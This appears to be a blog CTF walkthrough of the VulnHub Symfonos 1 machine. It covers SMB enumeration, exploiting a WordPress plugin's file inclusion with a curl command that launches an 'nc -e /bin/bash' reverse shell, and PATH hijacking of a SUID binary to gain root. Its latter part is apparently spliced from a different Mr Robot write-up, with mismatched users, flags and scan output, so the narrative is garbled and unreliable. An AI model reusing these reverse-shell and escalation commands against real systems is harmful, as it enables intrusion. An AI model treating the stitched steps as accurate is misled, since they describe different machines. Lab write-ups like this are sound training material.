---
layout: single
title: '<span class="vulnhub"> Synfonos 1 y 2 - /VulnHub</span>'
excerpt: "Synfonos 1&2 are a machines from VulnHub. I highly recommend you do this CTF because it is an eCpptv2 Like machine. On this machine we will have to brute force, exploit a Wordpress which will be shown several ways to do so valid for the machine, perform more brute force and finally perform a privilege escalation via suid explotation."
date: 2021-09-05
header:

  teaser_home_page: true



categories:

  - vulnhub
  - machine
tags:  
  - wordpress
  - bruteforce
  - suid
  - privilege-escalation
  - web
  - php
  - reverse-shell
  - wpscan
  - hydra
  - linux
toc: true
toc_label: "Content"
toc_sticky: true
show_time: true
---


Synfonos 1&2 are a machines from VulnHub. I highly recommend you do this CTF because it is an eCpptv2 Like machine. On this machine we will have to brute force, exploit a Wordpress which will be shown several ways to do so valid for the machine, perform more brute force and finally perform a privilege escalation via suid explotation.same for Synfonos 2, i added because i wanted to practice pivoting using chisel and proxychains

On this machine we will see two ways (among others) of exploiting a Wordpress service due to its outdatedness and insecurity, then we will escalate privileges thanks to an old version of nmap.

**We will see all this from the perspective and methodology of a penetration test.**

- Link to the machine: [Synfonos1](https://www.vulnhub.com/entry/symfonos-1,322/)
- Difficulty assigned by Vulhub: Medium

Let's get them


## Preparation

 - first of all, we need to know the ip of our target so we will start our first phase which is the reconnaissance, so we will search for IP's in our local net using arp-scan command

```bash
❯ arp-scan -Iens33 --localnet
Interface: ens33, type: EN10MB, MAC: 00:0c:29:f2:37:49, IPv4: 192.168.100.53
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.100.1	64:5e:10:84:35:47	(Unknown)
192.168.100.10	90:e8:68:d0:da:47	(Unknown)
192.168.100.5	58:9a:3e:6e:27:40	(Unknown)
192.168.100.6	34:25:be:68:6f:95	(Unknown)
192.168.100.7	24:18:c6:dc:bd:cd	(Unknown)
192.168.100.58	00:0c:29:a9:d6:5f	VMware, Inc.
192.168.100.55	2a:4a:70:be:fb:07	(Unknown: locally administered)

7 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.7: 256 hosts scanned in 1.993 seconds (128.45 hosts/sec). 7 responded
```
## Enumeration

The first thing we will do is scan the machine and see which external ports are open.
To execute this we will make use of nmap and use a series of parameters that will make our scan faster, as port scanning on certain machines can take quite some time.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.100.58 -oG allPorts
```

The explanation of the meaning of each flag is as follows:

- ```-p-``` : We indicate that the scan will be done for all ports.
- ```--open``` : We indicate that we are only interested in ports that are open.
- ```-sS``` : This flag indicates that we want to do a "SYN Scan" which means that the packets we will send will never complete the TCP connections and that will make our scan much less intrusive and quieter.
- ```-Pn``` : With this option we indicate that we do not want to do host discovery (since we know who our target is).
- ```--min-rate 5000``` : This flag can be exchanged for ```-T5```, both are intended to make our scanning faster (and noisier...). To be more detailed this flag indicates that we don't want to send less than 5,000 packets per second.
- ```-vvv``` : (verbose) To see which ports appear as we are checking the open ports.
- ```-n``` : We don't want DNS resolution to be performed, since we are scanning an IP, not a domain.
- ```-oG allPorts```: export the output to allPorts.

From which we obtain the following output:

```php
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.100.58 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-15 20:24 CST
Initiating ARP Ping Scan at 20:24
Scanning 192.168.100.58 [1 port]
Completed ARP Ping Scan at 20:24, 0.03s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 20:24
Scanning 192.168.100.58 [65535 ports]
Discovered open port 22/tcp on 192.168.100.58
Discovered open port 80/tcp on 192.168.100.58
Discovered open port 25/tcp on 192.168.100.58
Discovered open port 445/tcp on 192.168.100.58
Discovered open port 139/tcp on 192.168.100.58
Completed SYN Stealth Scan at 20:24, 1.71s elapsed (65535 total ports)
Nmap scan report for 192.168.100.58
Host is up, received arp-response (0.00052s latency).
Scanned at 2023-04-15 20:24:14 CST for 1s
Not shown: 65530 closed tcp ports (reset)
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 64
25/tcp  open  smtp         syn-ack ttl 64
80/tcp  open  http         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
MAC Address: 00:0C:29:A9:D6:5F (VMware)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.87 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

At this point we know that there are 5 open ports: 22 (ssh) 25 (smtp) 139 (netbios-ssn)  80 (HTTP) and 445 (Dns), seeing this and that the SSH port is open (at least to the outside), it can be deduced that it has too many ways to enter the machine is through these ports involving http.

The step par excellence once we know which ports are open is to perform a scan to those ports by running a series of scripts in order to obtain more information: server version, technology, possible vulnerabilities, etc.

```bash
❯ nmap -sC -sV -p22,25,80,139,445 192.168.100.58 -oN target
```

Where :

- ```-sV``` : it will show the version of the service running on each port.
- ```-A``` : We will run all relevant scripts (provided by nmap) on these ports.
- ```-p 80,443```: Open ports.
- ```-oN target```: export the output to target.

Getting this output:

```php
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-02 22:26 CEST
Nmap scan report for 10.10.198.171
Host is up (0.044s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
```

To find out what we are dealing with based on the codename, we will run **WhatWeb**

```bash
http://192.168.100.58 [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[192.168.100.58]
```




After testing each of the open ports and watching them inside, I found an open directory on port 445 which is samba, that i am able to read.

At this point we know the following routes:

```
❯ smbmap -H 192.168.100.58
[+] Guest session   	IP: 192.168.100.58:445	Name: 192.168.100.58                                    
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	helios                                            	NO ACCESS	Helios personal share
	anonymous                                         	READ ONLY	
	IPC$                                              	NO ACCESS	IPC Service (Samba 4.5.16-Debian)
```

there seems to be  information, we will proceed to figure out, which consists of making requests with smbmap to the directory anonymous route and if there are some informarmatio we have to extracted from a dictionary called anonymous with the objective of obtaining information.

```bash
❯ smbmap --download anonymous/attention.txt -H 192.168.100.58
[+] Starting download: anonymous\attention.txt (154 bytes)
[+] File output to: /home/z3kk3n/Desktop/vulnHUB/synfonos1/nmap/192.168.100.58-anonymous_attention.txt
```

- seems that we have possible passwords:

```bash
❯ cat attention.txt
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: attention.txt
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'! 
   3   │ 
   4   │ Next person I find using one of these passwords will be fired!
   5   │ 
   6   │ -Zeus
```

The release of **Wfuzz** shows us several interesting things


and appears information in the user helios that actually we downloaded 

in file ```todo.txt``` that called my atention.

```
❯ smbmap -u helios -p qwerty -H 192.168.100.58
[+] IP: 192.168.100.58:445	Name: 192.168.100.58                                    
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	READ ONLY	Printer Drivers
	helios                                            	READ ONLY	Helios personal share
	anonymous                                         	READ ONLY	
	IPC$                                              	NO ACCESS	IPC Service (Samba 4.5.16-Debian)
❯ smbmap -u helios -p qwerty -H 192.168.100.58
[+] IP: 192.168.100.58:445	Name: 192.168.100.58                                    
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	READ ONLY	Printer Drivers
	helios                                            	READ ONLY	Helios personal share
	anonymous                                         	READ ONLY	
	IPC$                                              	NO ACCESS	IPC Service (Samba 4.5.16-Debian)
❯ smbmap -u helios -p epidioko -H 192.168.100.58
```

seems that the file has a route of an url lets try it in the port 80 that we saw in the first enumeration phase theres a interesting file,

If we access the url ```http://192.168.100.58/h3l105/```, we will be able to visualize just HTML5 format to apply the css, we have to do virtual hosting.
And if we add the hosting ```192.168.100.58 symfonos.local```, to the etc/hosts we will be able to watch the whole page in the perfect format.

In this page we can use a vulnerability that i found in exploit [database](https://www.exploit-db.com/exploits/40290)
 called mailmasta, tha page has a vulnerabily of Local file inclusion so let's enumerate the files of the page and let's find if we are able to find a possible way of gaining access
 
 ## Gaining Access

seems that we have access exploting this vulnerability  ```curl -s -X GET "http://192.168.100.58/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=whoami" page = helios``` let's make a reverse shell

After investigating that there are no resources to exploit for SQL or XSS injections, we will continue with the dictionary we encountered earlier, so we will access the ```❯ curl -s -X GET "http://192.168.100.58/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=nc+-e/bin/bash+192.168.100.53+443" ``` path.


On the one hand so far we have not found any potential user names... but by testing some credentials we can observe a vulnerability...




If we enter an invalid user the content manager tells us that the user is invalid, but if we enter an existing one it tells us that for that user the password is incorrect.

Thanks to this vulnerability we could enumerate possible users that are in the database, but it will not be necessary who we are interested in is Elliot (based on the thematic of the CTF we can extrapolate a series of potential names).

Reviewing the dictionary that we obtained before, I could see that there are many repeated words which will make our brute force attack based on dictionary take more time, for this we will order the dictionary and eliminate the repeated lines.

```bash
❯ curl -s -X GET "http://192.168.100.58/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=nc+-e/bin/bash+192.168.100.53+443"

and we have to stay hearing on port 443

❯ nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.100.53] from (UNKNOWN) [192.168.100.58] 41684
whoami 
helios
```
Let's make a TTY treatment

```bash
bash-4.4$ export TERM=xterm
bash-4.4$ script /dev/null -c bash
bash-4.4$ CTRL + Z
> stty raw -echo;fg
bash-4.4$ stty rows 198 columns 68

```


## Privilege escalation

- now we have to search for SUID  vulnerabilties ```bash-4.4$ find \-perm -4000 -user root 2>/dev/null```
seems that we can abuse of SUID let's try it

```bash
bash-4.4$ strings /opt/statuscheck
curl -I H
http://lH
ocalhostH
AWAVA
AUATL
[]A\A]A^A_
;*3$" 
seems that we could take advantage of curl
so lets do it 
bash-4.4$ cd /tmp/
bash-4.4$ ls
bash-4.4$ echo "chmod u+s /bin/bash" >> curl
bash-4.4$ chmod +x curl
bash-4.4$ PATH=.:$PATH
bash-4.4$ ./opt/statuscheck
bash -p
bash-4.4# whoami
root
bash-4.4# cd /root/
bash-4.4# ls
bash-4.4# cat proof.txt 

	Congrats on rooting symfonos:1!

                 \ __
--==/////////////[})))==*
                 / \ '          ,|
                    `\`\      //|                             ,|
                      \ `\  //,/'                           -~ |
   )             _-~~~\  |/ / |'|                       _-~  / ,
  ((            /' )   | \ / /'/                    _-~   _/_-~|
 (((            ;  /`  ' )/ /''                 _ -~     _-~ ,/'
 ) ))           `~~\   `\\/'/|'           __--~~__--\ _-~  _/, 
((( ))            / ~~    \ /~      __--~~  --~~  __/~  _-~ /
 ((\~\           |    )   | '      /        __--~~  \-~~ _-~
    `\(\    __--(   _/    |'\     /     --~~   __--~' _-~ ~|
     (  ((~~   __-~        \~\   /     ___---~~  ~~\~~__--~ 
      ~~\~~~~~~   `\-~      \~\ /           __--~~~'~~/
                   ;\ __.-~  ~-/      ~~~~~__\__---~~ _..--._
                   ;;;;;;;;'  /      ---~~~/_.-----.-~  _.._ ~\     
                  ;;;;;;;'   /      ----~~/         `\,~    `\ \        
                  ;;;;'     (      ---~~/         `:::|       `\\.      
                  |'  _      `----~~~~'      /      `:|        ()))),      
            ______/\/~    |                 /        /         (((((())  
          /~;;.____/;;'  /          ___.---(   `;;;/             )))'`))
         / //  _;______;'------~~~~~    |;;/\    /                ((   ( 
        //  \ \                        /  |  \;;,\                 `   
       (<_    \ \                    /',/-----'  _> 
        \_|     \\_                 //~;~~~~~~~~~ 
                 \_|               (,~~   
                                    \~\
                                     ~~

	Contact me via Twitter @zayotic to give feedback!



```

We will edit the values ```$ip``` and ```$port``` of our payload, by our IP and the port that we want to use (in my case the port 443 (this way our connection would be a little masked as a connection belonging to the web server)).

Now we will replace the content of the template 404 by the content of our payload, and we will save it.



We will initiate a listener, as we expect a connection from our victim.

```bash
nc -lvp 443
```

And simply visit a random page or even the page ```/wp-content/themes/twentyfifteen/404.php```.

As soon as we log in, we will have already obtained a shell revese to the user **daemon**.

### Upload of a fake plugin

To do so, go to Plugins -> Add New -> Upload Plugin.



We could use the payload mentioned in the previous section as is, but it will not comply with the format of a WordPress plugin... we will have to make our payload a valid plugin, to do this we will start by adding the following header to our payload.

```
/*

Plugin Name:  Reverse Shell

Plugin URI: http://mrrobot.com

Description: Shell

Version: 1.0

Author: Shockz

Author URI: http://mrrobot.com

Text Domain: Shell

Domain Path: /languages

*/
```

Now we need to pack everything in a zip file.

```bash
sudo zip reverse.zip php-reverse-shell.php
```

We will initiate a listener, as we expect a connection from our victim.

```bash
nc -lvp 443
```

Finally we will upload our payload ```reverse.zip```.



But this is not enough, now we have to activate it, for this we go back to Plugins and click on "Activate".



As soon as we activate it, we will have already obtained a shell revese to the user **daemon**.


## Continuing the exploitation

Either by one or the other method we have obtained a shell (or something similar, since it is a rawshell).



We are going to improve our shell and get a proper tty

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

At this point we can navigate through the file system, finding the user **robot** located in ```/home/robot```.



In this directory we can find 2 files, the second flag and what by the name seems to be a password encrypted in MD5.

If we try to see the key, we will not be able to, since the owner of this file is the user **robot** and only he can read the file and nothing else.



On the other hand we can consult the encrypted password.

So we copy it to a file on our machine, in my case I will call it ````````.

To decrypt it we will have to perform another brute force attack, this time we will use **John The Ripper** and the dictionary ```rockyou```.

```bash
john --format=raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash
```



Getting the password for the user **robot**.

Now in the shell we change the user and enter the credentials

```bash
su robot
```

Now being the user **robot** we will be able to visualize the 2nd flag.


## Privilege escalation

The first thing I tried was if I could execute some command with sudo (```sudo -l```). So my second step was to try to abuse some SUID, for that we executed the following command:

```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2> /dev/null
```



What stands out here is ```/usr/local/bin/nmap```.

We can consult in [GTFOBins](https://gtfobins.github.io) the way to abuse this *capability*.

As our purpose is to obtain command execution as superuser, we find this method.



where it appears that it is only available for nmap versions between 2.02 and 5.21, so we check our version.

```
nmap -V

nmap version 3.81 ( http://www.insecure.org/nmap/ )
```

As it is valid, we proceed to abuse this SUID.



Finally we get a rawshell as root, now we just need to display the last flag in ```/root/key-3-of-3.txt```


